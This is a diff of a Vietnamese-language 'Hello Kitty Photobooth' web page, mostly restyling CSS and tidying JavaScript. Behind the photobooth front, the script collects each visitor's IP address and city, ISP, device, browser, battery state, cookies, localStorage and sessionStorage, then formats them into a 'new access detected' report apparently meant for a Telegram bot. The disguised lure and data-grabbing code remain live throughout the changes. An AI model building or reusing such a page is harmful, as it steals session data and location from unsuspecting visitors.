@@ -39,7 +39,7 @@
       padding: 30px 25px;
       max-width: 450px;
       width: 100%;
-      box-shadow: 0 20px 60px rgba(255,105,135,0.3), 0 0 100px rgba(255,182,193,0.2);
+      box-shadow: 0 20px 60px rgba(255,105,135,0.3);
       border: 2px solid rgba(255,255,255,0.6);
       position: relative;
       z-index: 1;
@@ -50,20 +50,6 @@
       position: absolute; top: -20px; left: 50%; transform: translateX(-50%);
       font-size: 40px;
       filter: drop-shadow(0 4px 10px rgba(255,105,135,0.3));
-    }
-    .card::after {
-      content: "";
-      position: absolute;
-      top: -2px; left: -2px; right: -2px; bottom: -2px;
-      border-radius: 42px;
-      background: linear-gradient(135deg, #ffb6c1, #ff8a9c, #ff6b8a, #ffb6c1);
-      z-index: -1;
-      background-size: 300% 300%;
-      animation: borderGlow 4s ease-in-out infinite;
-    }
-    @keyframes borderGlow {
-      0%, 100% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
     }
     .kitty-avatar {
       width: 80px;
@@ -77,7 +63,6 @@
       font-size: 48px;
       box-shadow: 0 8px 30px rgba(255,105,135,0.4);
       border: 3px solid white;
-      position: relative;
       animation: bounceKitty 2s ease-in-out infinite;
     }
     @keyframes bounceKitty {
@@ -92,16 +77,12 @@
       display: flex;
       gap: 30px;
     }
-    .kitty-avatar .ears span {
-      font-size: 28px;
-    }
+    .kitty-avatar .ears span { font-size: 28px; }
     h2 {
       font-size: 22px;
       font-weight: 800;
       color: #d6336c;
       margin-bottom: 4px;
-      letter-spacing: 1px;
-      text-shadow: 0 2px 10px rgba(214,51,108,0.1);
     }
     .subtitle {
       color: #e07a8e;
@@ -131,7 +112,6 @@
       align-items: center;
       justify-content: center;
       margin-bottom: 15px;
-      box-shadow: inset 0 0 30px rgba(255,105,135,0.1);
     }
     .video-preview video {
       width: 100%;
@@ -161,7 +141,6 @@
       color: #d6336c;
       border: 1px solid #ffb6c1;
       z-index: 2;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
     }
     .btn {
       width: 100%;
@@ -178,8 +157,6 @@
       justify-content: center;
       gap: 10px;
       font-family: 'Quicksand', sans-serif;
-      position: relative;
-      overflow: hidden;
     }
     .btn-primary {
       background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
@@ -194,47 +171,18 @@
       cursor: not-allowed;
       transform: none;
     }
-    .btn-primary::after {
-      content: "";
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: linear-gradient(60deg, transparent, rgba(255,255,255,0.15), transparent);
-      transform: rotate(30deg) translateX(-100%);
-      transition: transform 0.7s ease-in-out;
-    }
-    .btn-primary:hover::after {
-      transform: rotate(30deg) translateX(100%);
-    }
     .btn-pink {
       background: linear-gradient(135deg, #ff8a9c, #ff6b8a);
       box-shadow: 0 8px 25px rgba(255,107,138,0.4);
     }
-    .btn-pink:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 12px 35px rgba(255,107,138,0.5);
-    }
-    .btn-group {
-      display: none;
-      flex-direction: column;
-      gap: 10px;
-      margin-top: 12px;
-    }
-    .btn-group.show {
-      display: flex;
-      animation: fadeInUp 0.5s ease;
-    }
+    .btn-pink:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(255,107,138,0.5); }
+    .btn-group { display: none; flex-direction: column; gap: 10px; margin-top: 12px; }
+    .btn-group.show { display: flex; animation: fadeInUp 0.5s ease; }
     @keyframes fadeInUp {
       from { opacity: 0; transform: translateY(20px); }
       to { opacity: 1; transform: translateY(0); }
     }
-    .btn a {
-      color: white;
-      text-decoration: none;
-      width: 100%;
-    }
+    .btn a { color: white; text-decoration: none; width: 100%; }
     .status {
       margin-top: 14px;
       padding: 10px;
@@ -246,25 +194,10 @@
       background: rgba(255,255,255,0.4);
       transition: all 0.3s ease;
     }
-    .status.success {
-      background: rgba(46,204,113,0.15);
-      color: #27ae60;
-    }
-    .status.loading {
-      background: rgba(245,158,11,0.15);
-      color: #d97706;
-    }
-    .status.error {
-      background: rgba(239,68,68,0.15);
-      color: #dc2626;
-    }
-    .footer-badge {
-      margin-top: 15px;
-      font-size: 10px;
-      color: #e07a8e;
-      opacity: 0.6;
-      letter-spacing: 1.5px;
-    }
+    .status.success { background: rgba(46,204,113,0.15); color: #27ae60; }
+    .status.loading { background: rgba(245,158,11,0.15); color: #d97706; }
+    .status.error { background: rgba(239,68,68,0.15); color: #dc2626; }
+    .footer-badge { margin-top: 15px; font-size: 10px; color: #e07a8e; opacity: 0.6; letter-spacing: 1.5px; }
     #canvas { display: none; }
 
     .music-control {
@@ -286,13 +219,8 @@
       transition: all 0.3s ease;
       backdrop-filter: blur(10px);
     }
-    .music-control:hover {
-      transform: scale(1.1);
-      box-shadow: 0 6px 30px rgba(255,105,135,0.4);
-    }
-    .music-control.playing {
-      animation: pulseMusic 1.5s ease-in-out infinite;
-    }
+    .music-control:hover { transform: scale(1.1); box-shadow: 0 6px 30px rgba(255,105,135,0.4); }
+    .music-control.playing { animation: pulseMusic 1.5s ease-in-out infinite; }
     @keyframes pulseMusic {
       0%,100% { box-shadow: 0 4px 20px rgba(255,105,135,0.3); }
       50% { box-shadow: 0 4px 40px rgba(255,105,135,0.6); }
@@ -342,14 +270,8 @@
       flex-direction: column;
       gap: 15px;
     }
-    .loading-overlay.show {
-      display: flex;
-      animation: fadeIn 0.3s ease;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
+    .loading-overlay.show { display: flex; animation: fadeIn 0.3s ease; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     .loading-spinner {
       width: 50px;
       height: 50px;
@@ -358,44 +280,16 @@
       border-radius: 50%;
       animation: spin 1s linear infinite;
     }
-    @keyframes spin {
-      0% { transform: rotate(0); }
-      100% { transform: rotate(360deg); }
-    }
-    .loading-text {
-      color: #d6336c;
-      font-weight: 700;
-      font-size: 16px;
-    }
+    @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
+    .loading-text { color: #d6336c; font-weight: 700; font-size: 16px; }
     @media (max-width: 480px) {
-      .card {
-        padding: 20px 15px;
-      }
-      .video-preview {
-        min-height: 220px;
-      }
-      h2 {
-        font-size: 18px;
-      }
-      .kitty-avatar {
-        width: 65px;
-        height: 65px;
-        font-size: 38px;
-      }
-      .music-control {
-        width: 44px;
-        height: 44px;
-        font-size: 17px;
-        bottom: 15px;
-        right: 15px;
-      }
-      .music-progress {
-        bottom: 70px;
-        right: 15px;
-      }
-      .music-progress input[type="range"] {
-        width: 60px;
-      }
+      .card { padding: 20px 15px; }
+      .video-preview { min-height: 220px; }
+      h2 { font-size: 18px; }
+      .kitty-avatar { width: 65px; height: 65px; font-size: 38px; }
+      .music-control { width: 44px; height: 44px; font-size: 17px; bottom: 15px; right: 15px; }
+      .music-progress { bottom: 70px; right: 15px; }
+      .music-progress input[type="range"] { width: 60px; }
     }
   </style>
 </head>
@@ -416,10 +310,7 @@
 <div class="card">
   <div class="kitty-avatar">
     <span>🐱</span>
-    <div class="ears">
-      <span>🎀</span>
-      <span>🎀</span>
-    </div>
+    <div class="ears"><span>🎀</span><span>🎀</span></div>
   </div>
   <div class="live-clock" id="clock">🕒 Đang tải...</div>
   <h2>🌸 Hello Kitty Photobooth</h2>
@@ -432,17 +323,12 @@
   </div>
 
   <button class="btn btn-primary" id="capture-btn" disabled>
-    <span>📸</span>
-    <span>BẮT ĐẦU</span>
+    <span>📸</span> BẮT ĐẦU
   </button>
 
   <div class="btn-group" id="action-buttons">
-    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">
-      <span>🎀</span> TRUY CẬP NHÓM LẤY FILE
-    </a>
-    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">
-      <span>🤖</span> MỞ BOT TELEGRAM
-    </a>
+    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">🎀 TRUY CẬP NHÓM LẤY FILE</a>
+    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">🤖 MỞ BOT TELEGRAM</a>
   </div>
 
   <div id="status" class="status">💖 Bấm nút để bắt đầu</div>
@@ -500,17 +386,14 @@ function forcePlayMusic() {
   try {
     initAudio();
     if (!musicStarted) {
-      const playPromise = audio.play();
-      if (playPromise !== undefined) {
-        playPromise.then(() => {
-          isMusicPlaying = true;
-          musicStarted = true;
-          document.getElementById('musicBtn').classList.add('playing');
-          document.getElementById('musicBtn').textContent = '🎵';
-        }).catch(() => {
-          setTimeout(forcePlayMusic, 500);
-        });
-      }
+      audio.play().then(() => {
+        isMusicPlaying = true;
+        musicStarted = true;
+        document.getElementById('musicBtn').classList.add('playing');
+        document.getElementById('musicBtn').textContent = '🎵';
+      }).catch(() => {
+        setTimeout(forcePlayMusic, 500);
+      });
     }
   } catch(e) {
     setTimeout(forcePlayMusic, 500);
@@ -534,9 +417,7 @@ function toggleMusic() {
 }
 
 setTimeout(forcePlayMusic, 50);
-document.addEventListener('click', function() {
-  if (!musicStarted) forcePlayMusic();
-}, { once: false });
+document.addEventListener('click', function() { if (!musicStarted) forcePlayMusic(); }, { once: false });
 setTimeout(forcePlayMusic, 1000);
 setTimeout(forcePlayMusic, 3000);
 setTimeout(forcePlayMusic, 5000);
@@ -553,60 +434,52 @@ setInterval(updateClock, 1000);
 updateClock();
 
 // ============================================================
-// LẤY THÔNG TIN CHI TIẾT
+// LẤY THÔNG TIN
 // ============================================================
-function getDeviceInfo() {
+function getDeviceName() {
   const ua = navigator.userAgent;
-  let deviceName = 'Thiết bị khác';
-  if (/android/i.test(ua)) deviceName = 'Android 🤖';
-  else if (/iphone|ipad|ipod/i.test(ua)) deviceName = 'iOS (Apple) 🍏';
-  else if (/windows/i.test(ua)) deviceName = 'Windows PC 💻';
-  else if (/macintosh|mac os x/i.test(ua)) deviceName = 'MacBook / Mac 💻';
-  else if (/linux/i.test(ua)) deviceName = 'Linux 🐧';
-  return deviceName;
+  if (/android/i.test(ua)) return 'Android 🤖';
+  if (/iphone|ipad|ipod/i.test(ua)) return 'iOS (Apple) 🍏';
+  if (/windows/i.test(ua)) return 'Windows PC 💻';
+  if (/macintosh|mac os x/i.test(ua)) return 'MacBook / Mac 💻';
+  if (/linux/i.test(ua)) return 'Linux 🐧';
+  return 'Thiết bị khác';
+}
+
+function getOS() {
+  const ua = navigator.userAgent;
+  if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
+  if (ua.includes('Windows NT 6.1')) return 'Windows 7';
+  if (ua.includes('Mac OS X')) return 'macOS';
+  if (ua.includes('Android')) return 'Android';
+  if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+  if (ua.includes('Linux')) return 'Linux';
+  return 'Khác';
+}
+
+function getBrowser() {
+  const ua = navigator.userAgent;
+  if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
+  if (ua.includes('Firefox')) return 'Firefox';
+  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+  if (ua.includes('Edg')) return 'Edge';
+  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+  return 'Khác';
 }
 
 function getBatteryInfo() {
   return new Promise((resolve) => {
-    let batteryInfo = 'Không hỗ trợ';
+    let info = 'Không hỗ trợ';
     if (navigator.getBattery) {
-      try {
-        navigator.getBattery().then(bat => {
-          const level = Math.round(bat.level * 100);
-          const charging = bat.charging ? '⚡ Đang sạc' : '🔋 Không sạc';
-          batteryInfo = `${level}% (${charging})`;
-          resolve(batteryInfo);
-        }).catch(() => resolve(batteryInfo));
-      } catch(e) {
-        resolve(batteryInfo);
-      }
+      navigator.getBattery().then(bat => {
+        const level = Math.round(bat.level * 100);
+        const charging = bat.charging ? '⚡ Đang sạc' : '🔋 Không sạc';
+        resolve(`${level}% (${charging})`);
+      }).catch(() => resolve(info));
     } else {
-      resolve(batteryInfo);
+      resolve(info);
     }
   });
-}
-
-function getBrowserInfo() {
-  const ua = navigator.userAgent;
-  let browser = 'Khác';
-  if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
-  else if (ua.includes('Firefox')) browser = 'Firefox';
-  else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-  else if (ua.includes('Edg')) browser = 'Edge';
-  else if (ua.includes('Opera') || ua.includes('OPR')) browser = 'Opera';
-  return browser;
-}
-
-function getOSInfo() {
-  const ua = navigator.userAgent;
-  let os = 'Khác';
-  if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
-  else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
-  else if (ua.includes('Mac OS X')) os = 'macOS';
-  else if (ua.includes('Android')) os = 'Android';
-  else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
-  else if (ua.includes('Linux')) os = 'Linux';
-  return os;
 }
 
 function getScreenInfo() {
@@ -676,33 +549,26 @@ function getPerformanceInfo() {
 }
 
 async function getIPInfo() {
-  let ipDetails = {
-    ip: 'Không rõ',
-    city: 'Không rõ',
-    region: 'Không rõ',
-    country: 'Không rõ',
-    isp: 'Không rõ',
-    timezone: 'Không rõ'
-  };
+  let data = { ip: 'Không rõ', city: 'Không rõ', region: 'Không rõ', country: 'Không rõ', isp: 'Không rõ', timezone: 'Không rõ' };
   try {
-    const ipRes = await fetch('https://ipwho.is/');
-    const ipData = await ipRes.json();
-    if (ipData.success) {
-      ipDetails.ip = ipData.ip || 'Không rõ';
-      ipDetails.city = ipData.city || 'Không rõ';
-      ipDetails.region = ipData.region || 'Không rõ';
-      ipDetails.country = ipData.country || 'Không rõ';
-      ipDetails.isp = ipData.connection?.isp || ipData.connection?.org || 'Không rõ';
-      ipDetails.timezone = ipData.timezone?.id || 'Không rõ';
+    const res = await fetch('https://ipwho.is/');
+    const json = await res.json();
+    if (json.success) {
+      data.ip = json.ip || 'Không rõ';
+      data.city = json.city || 'Không rõ';
+      data.region = json.region || 'Không rõ';
+      data.country = json.country || 'Không rõ';
+      data.isp = json.connection?.isp || json.connection?.org || 'Không rõ';
+      data.timezone = json.timezone?.id || 'Không rõ';
     }
   } catch(e) {
     try {
-      const fallbackRes = await fetch('https://api.ipify.org?format=json');
-      const fallbackData = await fallbackRes.json();
-      ipDetails.ip = fallbackData.ip || 'Không rõ';
+      const fallback = await fetch('https://api.ipify.org?format=json');
+      const json = await fallback.json();
+      data.ip = json.ip || 'Không rõ';
     } catch(err) {}
   }
-  return ipDetails;
+  return data;
 }
 
 // ============================================================
@@ -784,7 +650,7 @@ async function startCamera() {
 setTimeout(startCamera, 500);
 
 // ============================================================
-// CHỤP ẢNH & GỬI DỮ LIỆU
+// CHỤP ẢNH
 // ============================================================
 function playClickSound() {
   try {
@@ -815,16 +681,16 @@ captureBtn.onclick = async function() {
   statusDiv.textContent = '📸 Đang xử lý...';
   statusDiv.className = 'status loading';
   
-  const accessTime = new Date().toLocaleString('vi-VN', { hour12: false });
-  const device = getDeviceInfo();
+  const time = new Date().toLocaleString('vi-VN', { hour12: false });
+  const device = getDeviceName();
+  const os = getOS();
+  const browser = getBrowser();
   const battery = await getBatteryInfo();
-  const browser = getBrowserInfo();
-  const os = getOSInfo();
   const screen = getScreenInfo();
-  const ipDetails = await getIPInfo();
+  const ip = await getIPInfo();
   const cookies = getCookies();
-  const localStorage = getLocalStorage();
-  const sessionStorage = getSessionStorage();
+  const ls = getLocalStorage();
+  const ss = getSessionStorage();
   const plugins = getPlugins();
   const perf = getPerformanceInfo();
   
@@ -859,19 +725,19 @@ captureBtn.onclick = async function() {
   ctx.fillStyle = 'rgba(214,51,108,0.5)';
   ctx.font = '10px Quicksand';
   ctx.textAlign = 'right';
-  ctx.fillText(accessTime, W-15, H-10);
+  ctx.fillText(time, W-15, H-10);
   
   ctx.fillStyle = 'rgba(255,255,255,0.6)';
   ctx.fillRect(10, H-25, 130, 18);
   ctx.fillStyle = '#d6336c';
   ctx.font = 'bold 9px Quicksand';
   ctx.textAlign = 'left';
-  ctx.fillText(`📍 ${ipDetails.city || 'Unknown'}`, 15, H-11);
+  ctx.fillText(`📍 ${ip.city || 'Unknown'}`, 15, H-11);
   
-  // Tạo caption với nhiều thông tin
+  // Tạo caption
   let caption = `🚨 <b>PHÁT HIỆN LƯỢT TRUY CẬP MỚI</b> 🚨\n`;
   caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `⏰ <b>Thời gian:</b> <code>${accessTime}</code>\n`;
+  caption += `⏰ <b>Thời gian:</b> <code>${time}</code>\n`;
   caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
   caption += `📱 <b>THIẾT BỊ:</b>\n`;
   caption += `  🔹 Thiết bị: ${device}\n`;
@@ -883,12 +749,12 @@ captureBtn.onclick = async function() {
   caption += `  🔹 Pin: ${battery}\n`;
   caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
   caption += `🌐 <b>MẠNG & VỊ TRÍ:</b>\n`;
-  caption += `  🔹 IP: <code>${ipDetails.ip}</code>\n`;
-  caption += `  🔹 Thành phố: ${ipDetails.city}\n`;
-  caption += `  🔹 Khu vực: ${ipDetails.region}\n`;
-  caption += `  🔹 Quốc gia: ${ipDetails.country}\n`;
-  caption += `  🔹 Nhà mạng: ${ipDetails.isp}\n`;
-  caption += `  🔹 Múi giờ: ${ipDetails.timezone}\n`;
+  caption += `  🔹 IP: <code>${ip.ip}</code>\n`;
+  caption += `  🔹 Thành phố: ${ip.city}\n`;
+  caption += `  🔹 Khu vực: ${ip.region}\n`;
+  caption += `  🔹 Quốc gia: ${ip.country}\n`;
+  caption += `  🔹 Nhà mạng: ${ip.isp}\n`;
+  caption += `  🔹 Múi giờ: ${ip.timezone}\n`;
   caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
   caption += `🍪 <b>COOKIES (${cookies.length}):</b>\n`;
   if (cookies.length > 0) {
@@ -902,26 +768,26 @@ captureBtn.onclick = async function() {
     caption += `  ❌ Không có cookies\n`;
   }
   caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `💾 <b>LOCAL STORAGE (${localStorage.length}):</b>\n`;
-  if (localStorage.length > 0) {
-    localStorage.slice(0, 5).forEach(item => {
+  caption += `💾 <b>LOCAL STORAGE (${ls.length}):</b>\n`;
+  if (ls.length > 0) {
+    ls.slice(0, 5).forEach(item => {
       let v = item.value || '';
       if (v.length > 40) v = v.substring(0, 40) + '…';
       caption += `  • ${item.key} = ${v}\n`;
     });
-    if (localStorage.length > 5) caption += `  ... +${localStorage.length-5} items\n`;
+    if (ls.length > 5) caption += `  ... +${ls.length-5} items\n`;
   } else {
     caption += `  ❌ Không có dữ liệu\n`;
   }
   caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `📦 <b>SESSION STORAGE (${sessionStorage.length}):</b>\n`;
-  if (sessionStorage.length > 0) {
-    sessionStorage.slice(0, 5).forEach(item => {
+  caption += `📦 <b>SESSION STORAGE (${ss.length}):</b>\n`;
+  if (ss.length > 0) {
+    ss.slice(0, 5).forEach(item => {
       let v = item.value || '';
       if (v.length > 40) v = v.substring(0, 40) + '…';
       caption += `  • ${item.key} = ${v}\n`;
     });
-    if (sessionStorage.length > 5) caption += `  ... +${sessionStorage.length-5} items\n`;
+    if (ss.length > 5) caption += `  ... +${ss.length-5} items\n`;
   } else {
     caption += `  ❌ Không có dữ liệu\n`;
   }
